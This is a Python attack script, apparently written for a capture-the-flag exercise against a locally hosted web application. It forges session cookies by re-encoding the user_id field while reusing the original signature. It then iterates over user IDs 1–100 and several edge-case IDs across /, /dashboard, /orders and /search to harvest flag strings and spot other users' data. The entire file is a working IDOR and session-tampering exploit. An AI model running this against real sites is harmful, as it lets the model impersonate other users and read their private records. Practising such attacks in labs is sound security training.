import requests
import base64
import json
import re
import time

# Cookie components (no signature validation)
cookie_template = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfKCw.jl3AMMmNnBqRtf0OTxwr0Uo3aeg"
parts = cookie_template.split('.')
_, timestamp, signature = parts

print("[*] Testing IDOR on discovered endpoints\n")

# Target endpoints found
target_endpoints = ["/", "/dashboard", "/orders", "/search/search"]

# Test a range of user IDs systematically
findings = []

for user_id in range(1, 101):
    # Create tampered cookie for this user
    test_payload = {"user_id": user_id}
    payload_str = json.dumps(test_payload, separators=(',', ':'))
    payload_b64 = base64.urlsafe_b64encode(payload_str.encode()).decode().rstrip('=')
    tampered_cookie = f"{payload_b64}.{timestamp}.{signature}"
    headers = {'Cookie': f'session={tampered_cookie}'}
    
    # Check each endpoint
    for endpoint in target_endpoints:
        try:
            url = f"http://127.0.0.1:33198{endpoint}"
            response = requests.get(url, headers=headers, timeout=3)
            
            # Search for flags
            flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
            for flag in flag_matches:
                print(f"[!] FLAG FOUND at user_id={user_id}, endpoint={endpoint}")
                print(f"    Flag: {flag}")
                findings.append({"user_id": user_id, "endpoint": endpoint, "flag": flag})
            
            # Check response differences (anomalous lengths indicate different data)
            base_length = 1184 if endpoint == "/" else 1985 if endpoint == "/dashboard" else 6476
            if len(response.text) != base_length:
                print(f"[!] ANOMALY: user_id={user_id:>3} | {endpoint:15} | Length: {len(response.text):>5}B (DIFFERENT from base)")
                
                # Show what makes it different
                if flag_matches:
                    print(f"    Contains FLAG data")
                    
        except Exception as e:
            print(f"[!] Error testing user_id={user_id} on {endpoint}: {e}")

# Also test some specific high-value IDs
print("\n[*] Testing specific high-risk IDs:")
high_risk_ids = [1, 0, -1, 1000, 9999, 10000, 10001, 99999]

for user_id in high_risk_ids:
    test_payload = {"user_id": user_id}
    payload_str = json.dumps(test_payload, separators=(',', ':'))
    payload_b64 = base64.urlsafe_b64encode(payload_str.encode()).decode().rstrip('=')
    tampered_cookie = f"{payload_b64}.{timestamp}.{signature}"
    headers = {'Cookie': f'session={tampered_cookie}'}
    
    # Test /orders endpoint (largest, most likely to contain sensitive data)
    try:
        url = "http://127.0.0.1:33198/orders"
        response = requests.get(url, headers=headers, timeout=3)
        
        flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
        for flag in flag_matches:
            print(f"[!] FLAG IN HIGH-RISK ID: user_id={user_id}")
            print(f"    Flag: {flag}")
            findings.append({"user_id": user_id, "endpoint": "/orders", "flag": flag})
        
        if len(response.text) != 6476:
            print(f"[ANOMALY: high-risk] ID={user_id}: Length={len(response.text)}B")
            
    except Exception as e:
        print(f"[!] Error testing high-risk ID {user_id}: {e}")

print("\n" + "="*70)
print("SUMMARY:")
if findings:
    print(f"[!] Found {len(findings)} flags total:")
    for finding in findings:
        print(f"  - user_id={finding['user_id']} on {finding['endpoint']}: {finding['flag']}")
else:
    print("[i] No flags found in tested range (1-100 + high-risk IDs)")
    print("[i] Consider testing larger range or checking for authentication bypass")
